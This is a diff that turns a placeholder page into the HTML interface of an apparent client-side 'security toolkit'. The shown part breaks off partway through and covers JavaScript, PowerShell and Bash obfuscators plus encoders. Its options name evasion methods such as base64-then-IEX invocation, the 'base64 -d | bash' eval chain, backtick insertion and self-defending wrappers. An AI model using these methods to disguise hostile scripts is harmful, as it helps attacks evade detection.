@@ -1,51 +1,1947 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>我的网页</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Arch Hub — Security Toolkit</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
-  background:#0d0d0d;color:#e8e8e8;min-height:100vh;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
-  text-align:center;padding:40px 20px;
+:root {
+  --bg-0: #060910;
+  --bg-1: #0d1220;
+  --bg-2: #131b2e;
+  --bg-3: #1a2540;
+  --bg-4: #223050;
+  --accent: #6e56cf;
+  --accent-hi: #9b82f3;
+  --accent-lo: #3d2f7a;
+  --accent-glow: rgba(110, 86, 207, 0.25);
+  --teal: #2dd4bf;
+  --teal-lo: rgba(45, 212, 191, 0.12);
+  --warn: #f59e0b;
+  --danger: #ef4444;
+  --ok: #22c55e;
+  --text-0: #f0f4ff;
+  --text-1: #b8c4e0;
+  --text-2: #7a8aaa;
+  --text-3: #4a5878;
+  --border: rgba(110, 86, 207, 0.18);
+  --border-hi: rgba(110, 86, 207, 0.4);
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Inter', sans-serif;
 }
-h1{font-size:2rem;letter-spacing:2px;margin-bottom:8px}
-.subtitle{color:#888;font-size:.9rem;margin-bottom:40px}
-.stats{display:flex;gap:36px;margin-bottom:40px;flex-wrap:wrap;justify-content:center}
-.stat-num{font-size:2rem;font-weight:700;color:#4da6ff;line-height:1.2}
-.stat-label{font-size:.75rem;color:#666;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
-.tags{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-bottom:40px}
-.tag{border:1px solid #2a2a2a;color:#aaa;padding:6px 14px;border-radius:20px;font-size:.8rem}
-.cta{
-  display:inline-block;background:#4da6ff;color:#000;text-decoration:none;
-  padding:14px 36px;border-radius:8px;font-weight:700;font-size:1rem;margin-bottom:18px;
+
+@media (prefers-color-scheme: light) {
+  :root {
+    --bg-0: #060910;
+    --bg-1: #0d1220;
+    --bg-2: #131b2e;
+    --bg-3: #1a2540;
+    --bg-4: #223050;
+    --text-0: #f0f4ff;
+    --text-1: #b8c4e0;
+    --text-2: #7a8aaa;
+  }
 }
-.contact{color:#666;font-size:.85rem}
-.contact a{color:#4da6ff;text-decoration:none}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body {
+  height: 100%;
+  background: var(--bg-0);
+  color: var(--text-0);
+  font-family: var(--sans);
+  font-size: 14px;
+  line-height: 1.6;
+  overflow: hidden;
+}
+
+/* ── LAYOUT ── */
+.shell {
+  display: grid;
+  grid-template-columns: 230px 1fr;
+  grid-template-rows: 48px 1fr;
+  height: 100vh;
+  overflow: hidden;
+}
+
+/* ── TOPBAR ── */
+.topbar {
+  grid-column: 1 / -1;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 0 20px;
+  background: var(--bg-1);
+  border-bottom: 1px solid var(--border);
+  z-index: 10;
+}
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-family: var(--mono);
+  font-weight: 600;
+  font-size: 15px;
+  letter-spacing: -0.01em;
+  color: var(--text-0);
+  text-decoration: none;
+  user-select: none;
+}
+.logo-icon {
+  width: 24px;
+  height: 24px;
+  position: relative;
+  flex-shrink: 0;
+}
+.logo-icon svg { width: 100%; height: 100%; }
+.logo-sep {
+  width: 1px;
+  height: 20px;
+  background: var(--border-hi);
+  margin: 0 4px;
+}
+.logo-sub {
+  font-size: 11px;
+  font-weight: 400;
+  color: var(--text-3);
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+}
+.topbar-spacer { flex: 1; }
+.topbar-badge {
+  font-family: var(--mono);
+  font-size: 10px;
+  padding: 2px 8px;
+  border-radius: 3px;
+  background: var(--accent-lo);
+  color: var(--accent-hi);
+  border: 1px solid var(--accent-lo);
+  letter-spacing: 0.05em;
+}
+
+/* ── SIDEBAR ── */
+.sidebar {
+  background: var(--bg-1);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  padding: 12px 0 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+  scrollbar-width: thin;
+  scrollbar-color: var(--bg-4) transparent;
+}
+.sidebar::-webkit-scrollbar { width: 4px; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--bg-4); border-radius: 2px; }
+
+.nav-section {
+  padding: 16px 16px 4px;
+  font-size: 9px;
+  font-weight: 600;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-3);
+  font-family: var(--mono);
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  padding: 7px 16px;
+  cursor: pointer;
+  border-radius: 0;
+  color: var(--text-2);
+  font-size: 13px;
+  font-weight: 400;
+  transition: color 0.12s, background 0.12s;
+  border-left: 2px solid transparent;
+  position: relative;
+  user-select: none;
+}
+.nav-item:hover {
+  color: var(--text-1);
+  background: var(--bg-2);
+}
+.nav-item.active {
+  color: var(--accent-hi);
+  background: var(--bg-2);
+  border-left-color: var(--accent);
+}
+.nav-item.active::after {
+  content: '';
+  position: absolute;
+  right: 0;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 3px;
+  height: 60%;
+  background: var(--accent);
+  border-radius: 2px 0 0 2px;
+  opacity: 0;
+}
+.nav-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  flex-shrink: 0;
+  background: var(--text-3);
+  transition: background 0.12s;
+}
+.nav-item.active .nav-dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+.nav-item:hover .nav-dot { background: var(--text-2); }
+
+/* ── MAIN ── */
+.main {
+  overflow-y: auto;
+  background: var(--bg-0);
+  padding: 32px;
+  display: flex;
+  flex-direction: column;
+  gap: 24px;
+  scrollbar-width: thin;
+  scrollbar-color: var(--bg-3) transparent;
+}
+.main::-webkit-scrollbar { width: 6px; }
+.main::-webkit-scrollbar-thumb { background: var(--bg-3); border-radius: 3px; }
+
+.tool-panel {
+  display: none;
+  flex-direction: column;
+  gap: 20px;
+  animation: panelIn 0.15s ease;
+}
+.tool-panel.active { display: flex; }
+
+@keyframes panelIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+/* ── PANEL HEADER ── */
+.panel-header {
+  display: flex;
+  align-items: flex-start;
+  gap: 14px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid var(--border);
+}
+.panel-icon {
+  width: 36px;
+  height: 36px;
+  border-radius: 8px;
+  background: var(--bg-3);
+  border: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  color: var(--accent-hi);
+}
+.panel-icon svg { width: 18px; height: 18px; }
+.panel-title {
+  font-size: 18px;
+  font-weight: 600;
+  color: var(--text-0);
+  line-height: 1.3;
+  font-family: var(--sans);
+}
+.panel-desc {
+  font-size: 12px;
+  color: var(--text-2);
+  margin-top: 2px;
+  line-height: 1.5;
+}
+
+/* ── CARD ── */
+.card {
+  background: var(--bg-1);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+}
+.card-head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg-2);
+}
+.card-label {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--text-2);
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+}
+.card-actions {
+  display: flex;
+  gap: 6px;
+  align-items: center;
+}
+.card-body { padding: 14px; }
+
+/* ── TEXTAREA / INPUT ── */
+textarea, input[type="text"], input[type="number"], select {
+  width: 100%;
+  background: var(--bg-0);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  color: var(--text-0);
+  font-family: var(--mono);
+  font-size: 12.5px;
+  line-height: 1.65;
+  padding: 10px 12px;
+  resize: vertical;
+  outline: none;
+  transition: border-color 0.12s;
+  caret-color: var(--accent-hi);
+}
+textarea:focus, input[type="text"]:focus, input[type="number"]:focus, select:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 2px var(--accent-glow);
+}
+textarea { min-height: 140px; }
+select {
+  -webkit-appearance: none;
+  appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' fill='none'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236e56cf' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 10px center;
+  padding-right: 30px;
+  cursor: pointer;
+}
+select option { background: var(--bg-2); }
+
+/* ── BUTTONS ── */
+.btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 7px 16px;
+  border-radius: 5px;
+  border: none;
+  cursor: pointer;
+  font-family: var(--sans);
+  font-size: 12.5px;
+  font-weight: 500;
+  transition: all 0.12s;
+  text-decoration: none;
+  user-select: none;
+  white-space: nowrap;
+}
+.btn svg { width: 13px; height: 13px; flex-shrink: 0; }
+.btn-primary {
+  background: var(--accent);
+  color: #fff;
+}
+.btn-primary:hover { background: var(--accent-hi); }
+.btn-secondary {
+  background: var(--bg-3);
+  color: var(--text-1);
+  border: 1px solid var(--border);
+}
+.btn-secondary:hover {
+  background: var(--bg-4);
+  color: var(--text-0);
+  border-color: var(--border-hi);
+}
+.btn-ghost {
+  background: transparent;
+  color: var(--text-2);
+  border: 1px solid transparent;
+  padding: 4px 8px;
+  font-size: 11px;
+}
+.btn-ghost:hover {
+  background: var(--bg-3);
+  color: var(--text-1);
+  border-color: var(--border);
+}
+.btn-danger {
+  background: rgba(239, 68, 68, 0.12);
+  color: var(--danger);
+  border: 1px solid rgba(239, 68, 68, 0.2);
+}
+.btn-danger:hover { background: rgba(239, 68, 68, 0.2); }
+
+/* ── ROW / GRID ── */
+.row {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+  align-items: flex-end;
+}
+.row-nowrap { flex-wrap: nowrap; }
+.col { display: flex; flex-direction: column; gap: 6px; flex: 1; }
+.col-auto { flex: 0 0 auto; }
+.label {
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--text-2);
+  letter-spacing: 0.03em;
+  font-family: var(--mono);
+}
+
+/* ── NOTICE ── */
+.notice {
+  padding: 8px 12px;
+  border-radius: 5px;
+  font-size: 12px;
+  font-family: var(--mono);
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+  line-height: 1.5;
+  display: none;
+}
+.notice.show { display: flex; }
+.notice-ok { background: rgba(34,197,94,.08); border: 1px solid rgba(34,197,94,.2); color: #4ade80; }
+.notice-warn { background: rgba(245,158,11,.08); border: 1px solid rgba(245,158,11,.2); color: #fbbf24; }
+.notice-err { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.2); color: #f87171; }
+
+/* ── OPTIONS GRID ── */
+.opts {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+  gap: 10px;
+}
+.opt-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 10px;
+  background: var(--bg-2);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  cursor: pointer;
+  transition: border-color 0.1s, background 0.1s;
+  user-select: none;
+}
+.opt-item:hover { background: var(--bg-3); border-color: var(--border-hi); }
+.opt-label {
+  font-size: 12px;
+  color: var(--text-1);
+  font-family: var(--sans);
+}
+.opt-cb {
+  width: 14px;
+  height: 14px;
+  border-radius: 3px;
+  border: 1.5px solid var(--border-hi);
+  background: var(--bg-0);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  transition: background 0.1s, border-color 0.1s;
+}
+.opt-item.checked .opt-cb {
+  background: var(--accent);
+  border-color: var(--accent);
+}
+.opt-item.checked .opt-cb::after {
+  content: '';
+  display: block;
+  width: 8px;
+  height: 5px;
+  border-left: 1.5px solid #fff;
+  border-bottom: 1.5px solid #fff;
+  transform: rotate(-45deg) translateY(-1px);
+}
+
+/* ── STAT CHIPS ── */
+.stats-row {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+}
+.stat-chip {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 5px 10px;
+  background: var(--bg-2);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--text-2);
+}
+.stat-chip span { color: var(--accent-hi); font-weight: 500; }
+
+/* ── DASHBOARD ── */
+.dash-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+  gap: 10px;
+}
+.dash-card {
+  background: var(--bg-1);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  cursor: pointer;
+  transition: border-color 0.12s, background 0.12s, transform 0.12s;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.dash-card:hover {
+  border-color: var(--accent);
+  background: var(--bg-2);
+  transform: translateY(-1px);
+}
+.dash-card-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 7px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--accent-hi);
+  background: var(--bg-3);
+  border: 1px solid var(--border);
+}
+.dash-card-icon svg { width: 16px; height: 16px; }
+.dash-card-name {
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text-0);
+}
+.dash-card-cat {
+  font-size: 10px;
+  font-family: var(--mono);
+  color: var(--text-3);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+}
+
+/* ── HASH GRID ── */
+.hash-row {
+  display: grid;
+  grid-template-columns: 60px 1fr auto;
+  gap: 6px;
+  align-items: center;
+  padding: 6px 0;
+  border-bottom: 1px solid var(--border);
+}
+.hash-row:last-child { border-bottom: none; }
+.hash-name { font-family: var(--mono); font-size: 11px; color: var(--text-2); }
+.hash-val {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--teal);
+  word-break: break-all;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+/* ── FOOTER ── */
+.sidebar-footer {
+  margin-top: auto;
+  padding: 12px 16px 0;
+  border-top: 1px solid var(--border);
+}
+.sidebar-footer-text {
+  font-size: 10px;
+  color: var(--text-3);
+  font-family: var(--mono);
+  line-height: 1.6;
+}
+
+/* ── SCROLL TARGETS ── */
+#home-panel .dash-grid { max-width: 900px; }
+
+/* ── RESPONSIVE ── */
+@media (max-width: 700px) {
+  .shell { grid-template-columns: 1fr; grid-template-rows: 48px auto 1fr; }
+  .sidebar { display: none; }
+  .main { padding: 20px 16px; }
+}
 </style>
 </head>
 <body>
+<div class="shell">
 
-<h1>我的第一个网页</h1>
-<p class="subtitle">一句话介绍你的页面</p>
+<!-- TOPBAR -->
+<header class="topbar">
+  <a class="logo" onclick="navigate('home')" style="cursor:pointer">
+    <div class="logo-icon">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#6e56cf" opacity="0.9"/>
+        <path d="M2 17l10 5 10-5" stroke="#9b82f3" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M2 12l10 5 10-5" stroke="#6e56cf" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    Arch Hub
+    <div class="logo-sep"></div>
+    <span class="logo-sub">Security Toolkit</span>
+  </a>
+  <div class="topbar-spacer"></div>
+  <div class="topbar-badge">v2.4.1</div>
+</header>
 
-<div class="stats">
-  <div><div class="stat-num">7</div><div class="stat-label">Live</div></div>
-  <div><div class="stat-num">40</div><div class="stat-label">Views</div></div>
-  <div><div class="stat-num">8</div><div class="stat-label">Likes</div></div>
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="nav-section">Overview</div>
+  <div class="nav-item active" onclick="navigate('home')">
+    <div class="nav-dot"></div> Dashboard
+  </div>
+
+  <div class="nav-section">Obfuscators</div>
+  <div class="nav-item" onclick="navigate('js-obf')">
+    <div class="nav-dot"></div> JavaScript
+  </div>
+  <div class="nav-item" onclick="navigate('ps-obf')">
+    <div class="nav-dot"></div> PowerShell
+  </div>
+  <div class="nav-item" onclick="navigate('bash-obf')">
+    <div class="nav-dot"></div> Bash / Shell
+  </div>
+
+  <div class="nav-section">Encode / Decode</div>
+  <div class="nav-item" onclick="navigate('base64')">
+    <div class="nav-dot"></div> Base64
+  </div>
+  <div class="nav-item" onclick="navigate('url-enc')">
+    <div class="nav-dot"></div> URL Encode
+  </div>
+  <div class="nav-item" onclick="navigate('hex-enc')">
+    <div class="nav-dot"></div> Hex
+  </div>
+  <div class="nav-item" onclick="navigate('html-enc')">
+    <div class="nav-dot"></div> HTML Entity
+  </div>
+
+  <div class="nav-section">Ciphers</div>
+  <div class="nav-item" onclick="navigate('xor')">
+    <div class="nav-dot"></div> XOR Cipher
+  </div>
+  <div class="nav-item" onclick="navigate('rot')">
+    <div class="nav-dot"></div> ROT13 / ROT-N
+  </div>
+  <div class="nav-item" onclick="navigate('caesar')">
+    <div class="nav-dot"></div> Caesar Cipher
+  </div>
+
+  <div class="nav-section">Hashing</div>
+  <div class="nav-item" onclick="navigate('hash')">
+    <div class="nav-dot"></div> Hash Generator
+  </div>
+
+  <div class="nav-section">Utilities</div>
+  <div class="nav-item" onclick="navigate('string-tools')">
+    <div class="nav-dot"></div> String Tools
+  </div>
+  <div class="nav-item" onclick="navigate('charcode')">
+    <div class="nav-dot"></div> Char Code
+  </div>
+
+  <div class="sidebar-footer">
+    <div class="sidebar-footer-text">All processing<br>runs client-side.</div>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<main class="main" id="main-area">
+
+<!-- ══════════════ DASHBOARD ══════════════ -->
+<div class="tool-panel active" id="home-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
+        <rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Arch Hub</div>
+      <div class="panel-desc">Client-side security toolkit — obfuscation, encoding, ciphers, and hashing. Nothing leaves your browser.</div>
+    </div>
+  </div>
+  <div class="dash-grid" id="dash-grid"></div>
 </div>
 
-<div class="tags">
-  <span class="tag">关键词一</span>
-  <span class="tag">关键词二</span>
-  <span class="tag">关键词三</span>
+<!-- ══════════════ JS OBFUSCATOR ══════════════ -->
+<div class="tool-panel" id="js-obf-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M14.5 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V7.5L14.5 2z"/>
+        <polyline points="14 2 14 8 20 8"/><path d="M10 12l-2 2 2 2"/><path d="M14 12l2 2-2 2"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">JavaScript Obfuscator</div>
+      <div class="panel-desc">Variable renaming · string hex encoding · control flow mangling · dead code injection</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Input — JavaScript source</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="clearField('js-in','js-out')">Clear</button>
+        <button class="btn btn-ghost" onclick="loadSample('js-in', jsSample)">Sample</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="js-in" placeholder="// Paste JavaScript here..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Options</span></div>
+    <div class="card-body">
+      <div class="opts" id="js-opts">
+        <div class="opt-item checked" data-key="renameVars" onclick="toggleOpt(this)">
+          <div class="opt-cb"></div><span class="opt-label">Rename variables</span>
+        </div>
+        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)">
+          <div class="opt-cb"></div><span class="opt-label">Encode strings (hex)</span>
+        </div>
+        <div class="opt-item checked" data-key="hexLiterals" onclick="toggleOpt(this)">
+          <div class="opt-cb"></div><span class="opt-label">Hex number literals</span>
+        </div>
+        <div class="opt-item" data-key="selfDefend" onclick="toggleOpt(this)">
+          <div class="opt-cb"></div><span class="opt-label">Self-defending wrapper</span>
+        </div>
+        <div class="opt-item" data-key="deadCode" onclick="toggleOpt(this)">
+          <div class="opt-cb"></div><span class="opt-label">Dead code injection</span>
+        </div>
+        <div class="opt-item" data-key="controlFlow" onclick="toggleOpt(this)">
+          <div class="opt-cb"></div><span class="opt-label">Control flow flatten</span>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="row">
+    <button class="btn btn-primary" onclick="obfuscateJS()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      Obfuscate
+    </button>
+    <button class="btn btn-secondary" onclick="copyOutput('js-out')">Copy output</button>
+  </div>
+  <div class="notice" id="js-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output — obfuscated</span>
+      <div class="card-actions">
+        <div class="stat-chip" id="js-stats" style="display:none"><span id="js-ratio">—</span> ratio</div>
+        <button class="btn btn-ghost" onclick="downloadText('js-out','obfuscated.js')">↓ Download</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="js-out" placeholder="// Output appears here..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
 </div>
 
-<a class="cta" href="https://你的链接" target="_blank">主要按钮</a>
-<p class="contact">联系方式：<a href="https://你的链接">点这里</a></p>
+<!-- ══════════════ POWERSHELL OBFUSCATOR ══════════════ -->
+<div class="tool-panel" id="ps-obf-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/>
+        <path d="M7 8l3 2-3 2m5 0h3"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">PowerShell Obfuscator</div>
+      <div class="panel-desc">Tick insertion · char-array substitution · base64 encoding · case randomisation</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Input — PowerShell</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="clearField('ps-in','ps-out')">Clear</button>
+        <button class="btn btn-ghost" onclick="loadSample('ps-in', psSample)">Sample</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="ps-in" placeholder="# Paste PowerShell script here..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Technique</span></div>
+    <div class="card-body">
+      <div class="col">
+        <label class="label">Method</label>
+        <select id="ps-method">
+          <option value="tick">Tick insertion (backtick junk)</option>
+          <option value="char">Char array ([char]0x49+[char]0x45+…)</option>
+          <option value="b64">Base64 encode + invoke (IEX)</option>
+          <option value="caserand">Case randomisation</option>
+          <option value="combo">Combo (tick + case + string split)</option>
+        </select>
+      </div>
+    </div>
+  </div>
+  <div class="row">
+    <button class="btn btn-primary" onclick="obfuscatePS()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      Obfuscate
+    </button>
+    <button class="btn btn-secondary" onclick="copyOutput('ps-out')">Copy output</button>
+  </div>
+  <div class="notice" id="ps-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output — obfuscated</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="downloadText('ps-out','obfuscated.ps1')">↓ Download</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="ps-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
 
+<!-- ══════════════ BASH OBFUSCATOR ══════════════ -->
+<div class="tool-panel" id="bash-obf-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M4 17l6-6-6-6"/><path d="M12 19h8"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Bash / Shell Obfuscator</div>
+      <div class="panel-desc">Hex eval wrapping · variable substitution · IFS splitting · base64 eval chain</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Input — shell script</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="clearField('bash-in','bash-out')">Clear</button>
+        <button class="btn btn-ghost" onclick="loadSample('bash-in', bashSample)">Sample</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="bash-in" placeholder="#!/bin/bash&#10;# Paste script here..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Method</span></div>
+    <div class="card-body">
+      <div class="col">
+        <select id="bash-method">
+          <option value="b64">Base64 eval (echo … | base64 -d | bash)</option>
+          <option value="hex">Hex octal substitution</option>
+          <option value="varsplit">Variable fragmentation</option>
+          <option value="ifs">IFS command splitting</option>
+        </select>
+      </div>
+    </div>
+  </div>
+  <div class="row">
+    <button class="btn btn-primary" onclick="obfuscateBash()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      Obfuscate
+    </button>
+    <button class="btn btn-secondary" onclick="copyOutput('bash-out')">Copy output</button>
+  </div>
+  <div class="notice" id="bash-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output — obfuscated</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="downloadText('bash-out','obfuscated.sh')">↓ Download</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="bash-out" placeholder="# Output appears here..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ BASE64 ══════════════ -->
+<div class="tool-panel" id="base64-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Base64 Encode / Decode</div>
+      <div class="panel-desc">Standard RFC 4648 · URL-safe variant · raw output mode</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="b64-in" placeholder="Paste text or base64 here..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Variant</label>
+      <select id="b64-variant">
+        <option value="std">Standard (+ / =)</option>
+        <option value="url">URL-safe (- _ no pad)</option>
+      </select>
+    </div>
+    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
+      <button class="btn btn-primary" onclick="b64Encode()">Encode →</button>
+      <button class="btn btn-secondary" onclick="b64Decode()">← Decode</button>
+    </div>
+  </div>
+  <div class="notice" id="b64-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="swapFields('b64-in','b64-out')">⇄ Swap</button>
+        <button class="btn btn-ghost" onclick="copyOutput('b64-out')">Copy</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="b64-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ URL ENCODE ══════════════ -->
+<div class="tool-panel" id="url-enc-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">URL Encode / Decode</div>
+      <div class="panel-desc">encodeURIComponent · full percent encoding · double-encode</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="url-in" placeholder="Paste URL or encoded string here..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Mode</label>
+      <select id="url-mode">
+        <option value="component">encodeURIComponent (default)</option>
+        <option value="full">Full encode (all non-ASCII)</option>
+        <option value="double">Double encode (%25xx)</option>
+      </select>
+    </div>
+    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
+      <button class="btn btn-primary" onclick="urlEncode()">Encode →</button>
+      <button class="btn btn-secondary" onclick="urlDecode()">← Decode</button>
